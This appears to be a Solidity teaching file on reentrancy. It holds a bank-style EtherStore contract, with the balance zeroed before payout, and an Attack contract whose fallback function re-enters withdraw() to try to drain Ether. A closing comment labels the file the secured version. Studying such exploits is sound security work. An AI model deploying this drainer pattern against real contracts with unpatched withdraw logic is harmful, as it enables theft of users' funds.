// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EtherStore{  //lets say wemabank as name of cntract
    mapping (address => uint) public balances;// name of mapping is balances
    function deposit() public payable { // it shows you want to deposit which will require your address and amount
        balances[msg.sender] += msg.value;

    }

    function withdraw() public {
        uint bal = balances[msg.sender];//saving balances... inside bal
        require(bal >0, "Your balance is equal to zero"); //only those with their acct greater than 0 can have access

     balances[msg.sender] = 0;

    (bool sent,) = msg.sender.call{value: bal}("");
    require(sent, "Transfer did not go through");

    
    }

}


contract Attack{
 //aim is to deposit money to the account and withdraw with much more profit   
    EtherStore public  etherStore;//etherstore is the name of the state variable
 uint constant public  AMOUNT = 1 ether;

 constructor(address _etherStoreAddress) {// the address of the contract you want to hack
  etherStore = EtherStore(_etherStoreAddress);

 }

 //create a fallback function
 fallback() external payable { 
    if (address(etherStore).balance >= AMOUNT) {
        etherStore.withdraw();
    }
 }

 function attack() external payable  {
    require(msg.value >= AMOUNT);
    etherStore.deposit{value: AMOUNT}();
    etherStore.withdraw();
 }
}

//THE SECURED CONTRACT OF REENTRANCY